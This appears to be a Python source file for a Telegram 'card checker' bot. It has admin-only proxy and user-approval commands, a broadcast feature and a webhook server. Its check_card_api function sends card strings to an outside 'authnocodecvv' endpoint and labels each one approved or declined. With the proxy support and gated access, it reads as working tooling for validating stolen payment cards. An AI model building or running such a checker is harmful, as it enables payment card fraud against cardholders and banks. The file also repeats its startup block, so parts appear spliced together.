def set_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    try:
        proxy_url = message.text.split(None, 1)[1].strip()
        success, msg = set_proxy(proxy_url)
        icon = "✅" if success else "❌"
        text = f"╔═══════════════════════════╗\n"
        text += f"║      <b>{icon} PROXY</b>          ║\n"
        text += f"╚═══════════════════════════╝\n\n"
        text += f"<b>{msg}</b>"
        bot.send_message(message.chat.id, text, parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "❌ <b>Usage:</b> <code>/proxy http://user:pass@host:port</code>", parse_mode='HTML')

@bot.message_handler(commands=['removeproxy'])
def remove_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    msg = remove_proxy()
    text = "╔═══════════════════════════╗\n"
    text += "║   <b>✅ PROXY REMOVED</b>      ║\n"
    text += "╚═══════════════════════════╝\n\n"
    text += f"<b>{msg}</b>"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['proxystatus'])
def proxy_status(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    text = "╔═══════════════════════════╗\n"
    text += "║    <b>📊 PROXY STATUS</b>     ║\n"
    text += "╚═══════════════════════════╝\n\n"
    if ACTIVE_PROXY:
        text += f"✅ <b>Proxy Active</b>\n<code>{ACTIVE_PROXY}</code>"
    else:
        text += "❌ <b>No proxy set</b>\n(direct connection)"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    text = f"╔═══════════════════════════╗\n"
    text += f"║   <b>👥 APPROVED USERS</b>    ║\n"
    text += f"╚═══════════════════════════╝\n\n"
    text += f"<b>Total:</b> {len(approved_users)}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    if approved_users:
        for user_id in approved_users:
            text += f"🆔 <code>{user_id}</code>\n"
    else:
        text += "<i>No approved users</i>"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['pending'])
def list_pending(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    text = f"╔═══════════════════════════╗\n"
    text += f"║  <b>⏳ PENDING REQUESTS</b>   ║\n"
    text += f"╚═══════════════════════════╝\n\n"
    text += f"<b>Total:</b> {len(pending_requests)}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    if pending_requests:
        for user_id, info in pending_requests.items():
            text += f"👤 <b>{info['name']}</b>\n"
            text += f"🔗 @{info['username']}\n"
            text += f"🆔 <code>{user_id}</code>\n"
            text += f"📅 {info['date']}\n\n"
    else:
        text += "<i>No pending requests</i>"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    try:
        msg = message.text.split(None, 1)[1]
        sent = 0
        for user_id in approved_users:
            try:
                broadcast_text = "╔═══════════════════════════╗\n"
                broadcast_text += "║    <b>📢 BROADCAST</b>        ║\n"
                broadcast_text += "╚═══════════════════════════╝\n\n"
                broadcast_text += msg
                bot.send_message(user_id, broadcast_text, parse_mode='HTML')
                sent += 1
            except:
                pass
        bot.send_message(message.chat.id, f"✅ <b>Broadcast sent to {sent} users</b>", parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "❌ <b>Usage:</b> <code>/broadcast MESSAGE</code>", parse_mode='HTML')

@bot.message_handler(commands=['adminsettings'])
def admin_settings(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    
    global admin_default_site
    
    try:
        url = message.text.split(None, 1)[1].strip()
        if not url.startswith('http'):
            bot.send_message(message.chat.id, "❌ <b>URL must start with http:// or https://</b>", parse_mode='HTML')
            return
        
        admin_default_site = url
        text = "╔═══════════════════════════╗\n"
        text += "║  <b>✅ ADMIN SITE SET</b>     ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += f"🌍 <b>Admin default site set to:</b>\n<code>{url}</code>\n\n"
        text += "📝 <i>All users without custom sites will use this</i>"
        bot.send_message(message.chat.id, text, parse_mode='HTML')
    except:
        # Show current settings
        text = "╔═══════════════════════════╗\n"
        text += "║   <b>⚙️ ADMIN SETTINGS</b>    ║\n"
        text += "╚═══════════════════════════╝\n\n"
        
        if admin_default_site:
            text += f"🌍 <b>Current Admin Site:</b>\n<code>{admin_default_site}</code>\n\n"
        else:
            text += "❌ <b>No admin default site set</b>\n\n"
        
        text += "<b>Usage:</b> <code>/adminsettings URL</code>\n"
        text += "<b>Remove:</b> <code>/adminsettings remove</code>"
        bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['approve', 'deny', 'remove'])
def admin_user_commands(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 <b>Admin only command</b>", parse_mode='HTML')
        return
    
    global admin_default_site
    
    try:
        command_parts = message.text.split()
        
        # Handle adminsettings remove
        if message.text.startswith('/adminsettings') and len(command_parts) > 1 and command_parts[1].lower() == 'remove':
            admin_default_site = None
            text = "╔═══════════════════════════╗\n"
            text += "║  <b>✅ SITE REMOVED</b>       ║\n"
            text += "╚═══════════════════════════╝\n\n"
            text += "🔄 <b>Admin default site removed</b>\n"
            text += "Users will now use bot default site"
            bot.send_message(message.chat.id, text, parse_mode='HTML')
            return
        
        if len(command_parts) < 2:
            bot.send_message(message.chat.id, f"<b>Usage:</b> <code>/{command_parts[0].strip('/')} USER_ID</code>", parse_mode='HTML')
            return
        user_id = int(command_parts[1])
        
        if message.text.startswith('/approve'):
            approved_users.add(user_id)
            pending_requests.pop(user_id, None)
            save_users()
            bot.send_message(message.chat.id, f"✅ <b>User {user_id} approved!</b>", parse_mode='HTML')
            try:
                approval_msg = "╔═══════════════════════════╗\n"
                approval_msg += "║    <b>🎉 APPROVED!</b>        ║\n"
                approval_msg += "╚═══════════════════════════╝\n\n"
                approval_msg += "✅ <b>Access granted!</b>\n"
                approval_msg += "🚀 Type /start to begin"
                bot.send_message(user_id, approval_msg, parse_mode='HTML')
            except:
                pass
        elif message.text.startswith('/deny'):
            pending_requests.pop(user_id, None)
            save_users()
            bot.send_message(message.chat.id, f"❌ <b>User {user_id} denied!</b>", parse_mode='HTML')
            try:
                deny_msg = "╔═══════════════════════════╗\n"
                deny_msg += "║      <b>❌ DENIED</b>          ║\n"
                deny_msg += "╚═══════════════════════════╝\n\n"
                deny_msg += "🚫 <b>Access denied by admin</b>"
                bot.send_message(user_id, deny_msg, parse_mode='HTML')
            except:
                pass
        elif message.text.startswith('/remove'):
            approved_users.discard(user_id)
            save_users()
            bot.send_message(message.chat.id, f"🗑️ <b>User {user_id} removed!</b>", parse_mode='HTML')
            try:
                remove_msg = "╔═══════════════════════════╗\n"
                remove_msg += "║     <b>⚠️ REVOKED</b>         ║\n"
                remove_msg += "╚═══════════════════════════╝\n\n"
                remove_msg += "⚠️ <b>Your access has been revoked</b>"
                bot.send_message(user_id, remove_msg, parse_mode='HTML')
            except:
                pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ <b>Invalid user ID format</b>", parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode='HTML')

# ==================== USER ACCESS REQUEST ====================
@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    
    if is_approved(user_id):
        text = "╔═══════════════════════════╗\n"
        text += "║     <b>✅ APPROVED</b>        ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += "🎉 <b>You already have access!</b>"
        bot.send_message(message.chat.id, text, parse_mode='HTML')
        return
    
    if user_id in pending_requests:
        text = "╔═══════════════════════════╗\n"
        text += "║     <b>⏳ PENDING</b>         ║\n"
        text += "╚═══════════════════════════╝\n\n"
        text += "⏱️ <b>Your request is pending</b>\n"
        text += "Please wait for approval..."
        bot.send_message(message.chat.id, text, parse_mode='HTML')
        return
    
    username = message.from_user.username or "No username"
    first_name = message.from_user.first_name or "Unknown"
    last_name = message.from_user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    admin_msg = "╔═══════════════════════════╗\n"
    admin_msg += "║ <b>📥 NEW ACCESS REQUEST</b>  ║\n"
    admin_msg += "╚═══════════════════════════╝\n\n"
    admin_msg += f"👤 <b>Name:</b> {full_name}\n"
    admin_msg += f"🔗 <b>Username:</b> @{username}\n"
    admin_msg += f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
    admin_msg += f"📅 <b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    admin_msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    admin_msg += "<b>Approve this user?</b>"
    
    bot.send_message(ADMIN_ID, admin_msg, reply_markup=markup, parse_mode='HTML')
    
    user_msg = "╔═══════════════════════════╗\n"
    user_msg += "║   <b>📤 REQUEST SENT</b>      ║\n"
    user_msg += "╚═══════════════════════════╝\n\n"
    user_msg += "✅ <b>Request sent to admin</b>\n"
    user_msg += "⏳ Please wait for approval..."
    bot.send_message(message.chat.id, user_msg, parse_mode='HTML')

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_') or call.data.startswith('deny_'))
def handle_approval_callback(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Admin only!")
        return
    
    action, user_id = call.data.split('_')
    user_id = int(user_id)
    
    if action == 'approve':
        approved_users.add(user_id)
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "✅ User approved!")
        bot.edit_message_text(f"✅ <b>User {user_id} has been APPROVED!</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        try:
            approval_msg = "╔═══════════════════════════╗\n"
            approval_msg += "║    <b>🎉 APPROVED!</b>        ║\n"
            approval_msg += "╚═══════════════════════════╝\n\n"
            approval_msg += "✅ <b>Access granted!</b>\n"
            approval_msg += "🚀 Type /start to begin"
            bot.send_message(user_id, approval_msg, parse_mode='HTML')
        except:
            pass
    elif action == 'deny':
        pending_requests.pop(user_id, None)
        save_users()
        bot.answer_callback_query(call.id, "❌ User denied!")
        bot.edit_message_text(f"❌ <b>User {user_id} has been DENIED!</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        try:
            deny_msg = "╔═══════════════════════════╗\n"
            deny_msg += "║      <b>❌ DENIED</b>          ║\n"
            deny_msg += "╚═══════════════════════════╝\n\n"
            deny_msg += "🚫 <b>Access denied by admin</b>"
            bot.send_message(user_id, deny_msg, parse_mode='HTML')
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def handle_stop_check(call):
    chat_id = int(call.data.split('_')[2])
    if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
        stop_checking[chat_id] = True
        bot.answer_callback_query(call.id, "🛑 Stopping check...")

# ==================== START BOT ====================
if __name__ == '__main__':
    print("=" * 50)
    print("🤖 YOSH CARD CHECKER BOT")
    print("=" * 50)
    
    # Load users
    approved_users, pending_requests = load_users()
    
    print(f"✅ Bot started successfully!")
    print(f"📊 Loaded {len(approved_users)} approved users")
    print(f"⏳ {len(pending_requests)} pending requests")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("=" * 50)
    print("🔄 Bot is running... Press Ctrl+C to stop")
    print("=" * 50)
    
    

# ==== UPDATED API CHECKER ====
API_URL = "https://jossalicious.org/api/authnocodecvv.php"

def check_card_api(card):
    try:
        response = requests.get(f"{API_URL}?cc={card}", timeout=15)

        if response.status_code != 200:
            return f"API Error: HTTP {response.status_code}"

        try:
            data = response.json()
        except:
            return f"API Error: Invalid response -> {response.text[:100]}"

        # Customize depending on API response structure
        if isinstance(data, dict):
            if data.get("status") == "approved":
                return "✅ APPROVED"
            elif data.get("status") == "declined":
                return "❌ DECLINED"
            else:
                return f"⚠️ UNKNOWN: {data}"
        else:
            return f"⚠️ Unexpected format: {data}"

    except Exception as e:
        return f"API Exception: {str(e)}"

# ==== END UPDATED API ====


# ===== WEBHOOK MODE =====
from flask import Flask, request

app = Flask(__name__)

WEBHOOK_URL = os.environ.get("WEBHOOK_URL")

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return 'OK', 200


if __name__ == '__main__':
    print("🚀 Starting webhook bot...")

    approved_users, pending_requests = load_users()

    bot.remove_webhook()
    time.sleep(1)

    if not WEBHOOK_URL:
        print("❌ WEBHOOK_URL not set!")
        exit()

    bot.set_webhook(url=f"{WEBHOOK_URL}/webhook")
    print(f"✅ Webhook set → {WEBHOOK_URL}/webhook")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
